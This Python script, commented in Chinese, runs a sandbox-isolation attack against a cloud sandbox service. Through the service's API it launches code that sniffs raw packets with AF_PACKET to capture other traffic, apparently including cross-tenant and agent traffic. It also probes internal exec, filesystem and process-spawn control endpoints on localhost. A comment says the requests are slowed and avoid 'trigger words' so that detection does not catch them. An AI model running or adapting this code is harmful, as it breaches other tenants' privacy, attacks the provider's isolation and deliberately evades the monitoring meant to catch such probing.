# -*- coding: utf-8 -*-
"""实验J287u: AF_PACKET抓包观察agent通信 + 跨租户流量可见性"""
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("EXIT:", json.dumps(d.get("command", {}))[:300], flush=True)
        except Exception:
            print("NONJSON:", line[:400], flush=True)
    return out

NAME = "expj287u"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# cmd1: AF_PACKET 抓包 25s, 解析 TCP payload
out = run_cmd(sid, r'''
import socket, struct, time
def ip_str(b):
    return ".".join(str(x) for x in b)
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.settimeout(3)
    try:
        s.bind(("eth0", 0))
    except Exception as e:
        print("BIND eth0 EXC:", e, flush=True)
        try:
            s.bind(("lo", 0))
            print("bound lo", flush=True)
        except Exception as e2:
            print("BIND lo EXC:", e2, flush=True)
    print("SNIFF start", flush=True)
    t0 = time.time()
    counts = {}
    samples = []
    while time.time() - t0 < 25:
        try:
            data, addr = s.recvfrom(65535)
        except socket.timeout:
            continue
        if len(data) < 40:
            continue
        # 以太网: dst6+src6+etype2
        etype = struct.unpack("!H", data[12:14])[0]
        if etype != 0x0800:
            continue
        ip = data[14:]
        if len(ip) < 20:
            continue
        proto = ip[9]
        src = ip_str(ip[12:16])
        dst = ip_str(ip[16:20])
        key = (proto, src, dst)
        counts[key] = counts.get(key, 0) + 1
        if proto == 6 and len(ip) >= 40:  # TCP
            sport, dport = struct.unpack("!HH", ip[20:24])
            tcp_off = ((ip[12] >> 4) & 0xF) * 4
            payload = ip[20 + tcp_off:]
            if payload and len(samples) < 12:
                samples.append((src, sport, dst, dport, payload[:200]))
    s.close()
    print("=== FLOW COUNTS ===", flush=True)
    for k, v in sorted(counts.items(), key=lambda x: -x[1])[:20]:
        print("proto%d %s -> %s : %d" % (k[0], k[1], k[2], v), flush=True)
    print("=== TCP PAYLOAD SAMPLES ===", flush=True)
    for src, sp, dst, dp, pl in samples:
        print("%s:%d -> %s:%d %r" % (src, sp, dst, dp, pl), flush=True)
except Exception as e:
    print("SNIFF EXC:", type(e).__name__, e, flush=True)
print("DONE", flush=True)
''', "SNIFF", timeout=100)
print("SNIFF out:", repr((out or "")[:6000]), flush=True)

# cmd2: 慢速路径枚举 (避开 proxy/CONNECT 触发词)
out = run_cmd(sid, r'''
import socket, time
def req(port, path, method="GET"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", port))
        if method == "POST":
            r = (b"POST " + path.encode() + b" HTTP/1.1\r\nHost: init\r\n"
                 b"Content-Type: application/connect+json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}")
        else:
            r = (b"GET " + path.encode() + b" HTTP/1.1\r\nHost: init\r\nConnection: close\r\n\r\n")
        s.sendall(r)
        data = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 2500:
                    break
        except socket.timeout:
            pass
        s.close()
        return repr(data[:300])
    except Exception as e:
        return "EXC %s" % type(e).__name__
# 慢速: 每个请求后 2s 间隔, 每个命令最多 6 个请求
PATHS = ["/v1/exec", "/v1/health", "/v1/status", "/v1/logs", "/v1/events", "/v1/fs"]
for p in PATHS:
    print("23456 GET %s: %s" % (p, req(23456, p)), flush=True)
    time.sleep(2)
print("DONE", flush=True)
''', "PATH3", timeout=280)
print("PATH3 out:", repr((out or "")[:2000]), flush=True)

# cmd3: 慢速 POST 路径枚举 30002
out = run_cmd(sid, r'''
import socket, time
def req(port, path, method="POST"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", port))
        b = b"{}"
        r = (b"POST " + path.encode() + b" HTTP/1.1\r\nHost: init\r\n"
             b"Content-Type: application/connect+json\r\nContent-Length: " + str(len(b)).encode() +
             b"\r\nConnection: close\r\n\r\n" + b)
        s.sendall(r)
        data = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                data += d
                if len(data) > 2500:
                    break
        except socket.timeout:
            pass
        s.close()
        return repr(data[:300])
    except Exception as e:
        return "EXC %s" % type(e).__name__
PATHS = ["/vercel.sandbox.spawn.v1.SpawnService/Spawn",
         "/vercel.sandbox.spawn.v1.SpawnService/Ping",
         "/vercel.sandbox.spawn.v1.SpawnService/Kill",
         "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive",
         "/grpc.health.v1.Health/Check"]
for p in PATHS:
    print("30002 POST %s: %s" % (p, req(30002, p)), flush=True)
    time.sleep(2)
print("DONE", flush=True)
''', "PATH4", timeout=280)
print("PATH4 out:", repr((out or "")[:2000]), flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
